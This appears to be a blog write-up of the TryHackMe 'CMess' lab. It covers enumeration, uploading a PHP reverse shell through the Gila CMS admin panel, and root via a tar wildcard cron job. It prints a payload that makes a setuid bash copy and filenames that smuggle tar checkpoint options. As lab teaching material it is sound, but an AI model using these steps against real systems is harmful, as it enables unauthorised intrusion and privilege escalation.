---
layout: post
title: THM Cmess Write-up
excerpt_separator: <!--more-->
---
<img src="/img/cmess/cmess-img/0.head.png">
<!--more-->
<a href="https://tryhackme.com/room/cmess" target="_blank" > Click here to access this box on tryHackMe.com</a>
<p>Here I’m adding  “cmess.thm” and the IP address  to our hosts file.</p>
<img src="/img/cmess/1.hosts-file.png"/>

<p>As usual let’s start with a nmap scan. On my first scan I'm only going to scan the  top 1000. I do this by not adding an arguments.</p>
<img src="/img/cmess/2.nmap-scan-1.png">

<p>Nmap reports port 22 and 80 open.</p>
<img src="/img/cmess/3.nmap-scan-2.png"/>

<p>Let’s enumerate the ports on the server further by only scanning these two ports but adding -A option (everything) so we get  OS direction, version detection and service detection.  
</p>
<img src="/img/cmess/4.namp-scan-3.png"/>


<p>The scan shows OpenSSH 7.2p2 on port 22 and on port 80 we have  Apache 2.4.18 running a  CMS named Gila CMS. We should also note the robots.txt file has 3 disallowed entries “/src”, “/themes”, and “/lib”. </p>
<img src="/img/cmess/5.nmap-scan-4.png"/>


<p>Let’s use nmap to scan all 65k ports by using the option -p-. This will take awhile so let's start enumerating subdirectories while we wait. 
</p>
<img src="/img/cmess/6.nmap-scann-5.png"/>


<p>Here i’m using gobuster to enumerate the sub directories 
gobuster dir -u 10.10.101.52 -w /usr/share/wordlists/dirb/common.txt -t 200
</p>
<img src="/img/cmess/7.gobuster.png"/>


<p>While this is working let’s see what we have on port 80. Let’s see if we can get a version number of Gila CMS install</p>
<img src="/img/cmess/8.cms-index-page.png"/>


<p>I didn’t have any luck finding  a version, but while I was reviewing at the directories GoBuster discovered, I did find a login page URL. Let’s note this and  search for any known Gila CMS exploits. First let's check our nmap scan.  
</p>
<img src="/img/cmess/9.gilacms-login-page.png"/>


<p>Looks like we only have ports 22 and 80 open. Now on to our Gila CMS research.</p>
<img src="/img/cmess/10.nmap-scan6.png"/>


<p>There were several exploits for Gila CMS however, all of the ones I found needed authentication. So after a few hours of research and enumeration I found a sub directory using wfuzz  wfuzz -c -f subdomains.txt
-w/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107 --hw 290
</p>
<img src="/img/cmess/11.wfuzz.png"/>


<p>To access this we’ll need to add this sub domain to our hosts file.</p>
<img src="/img/cmess/12.hosts-file2.png"/>


<p>Navigating to this directory we find a development log with credentials and a clure to a poisable exploit. 
</p>
<img src="/img/cmess/13.dev-log.png"/>


<p>Navigate to the admin page and login. Also note  we have the version number 1.10.9. This may be helpful if we want to be more specific in our  exploits and vulnerability research .
</p>
<img src="/img/cmess/14.gilacma-admin-page.png"/>



<p>I started off enumerating the CMS  as I’ve  never used Gila CMS before and noticed there’s an option to upload/ create a directories and php files. Let’s  create a new directory named shell</p>
<img src="/img/cmess/14.gilacma-admin-page.png"/>

<p></p>
<img src="/img/cmess/15.shell-dir-create.png"/>


<p>Now create a shell.php file </p>
<img src="/img/cmess/16.create-shell.php.png"/>


<p>Now using a php reverse shell code by pentestmonkeys here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php let add the php code and change the IP and port number.</p>
<img src="/img/cmess/17.php-code.png"/>


<p>Save the php file in the admin portal.</p>
<img src="/img/cmess/18.php-code-saved.png"/>


<p>On our local machine setup a netcat listener.</p>
<img src="/img/cmess/19.setup-lisener.png"/>


<p>Navigate to the directory / shell.php and we have a shell. </p>
<img src="/img/cmess/20.rev-shell.png"/>


<p>After doing some quick enumeration (checking prems on the passwd,shadow,group files) we see that there’s a  backup cron job running as root that’s backing up everything in the /home/andre/backup. I’ve seen this before and it’s definitely an escalation path however, we need write access to the files being backed up. Currently, we don’t have the permissions to do so right now. We’ll have to keep enumerating.
</p>
<img src="/img/cmess/21.crontab.png"/>


<p>After running about halfway through my own privesc checklist, I tried hunting for backup files  using this command this command “find -type f -iname “*.bak” 2>/dev/null</p>
<p>I found a password.bak with Andre’s password. Let use it to shh in and gain a better more privilege shell</p>
<img src="/img/cmess/22.andres-password.png"/>


<p>And we’re in. Let’s cat andre user.txt file and see if we can get root from the cron job we found earlier.</p>
<img src="/img/cmess/23.andre-login.png"/>


<p>I’ve seen this before and it should be exploitable.</p>
<img src="/img/cmess/24.crontabjob.png"/>


<p>We’re going to create a file that will get backed up  run a command to give us root privileges echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh</p>
<img src="/img/cmess/25.create-the-payload.png"/>


<p>Now create these two files: </p>
*touch /home/andre/backup--checkpoint=1
*touch /home/andre/backup--checkpoint-action=sh\runme.sh
<img src="/img/cmess/26-create-thecheckpoint.png"/>


<p>Wait for the job to run and exec /tmp/bash -p now we’re root. </p>
<img src="/img/cmess/27.root.txt.png"/>


<p></p>





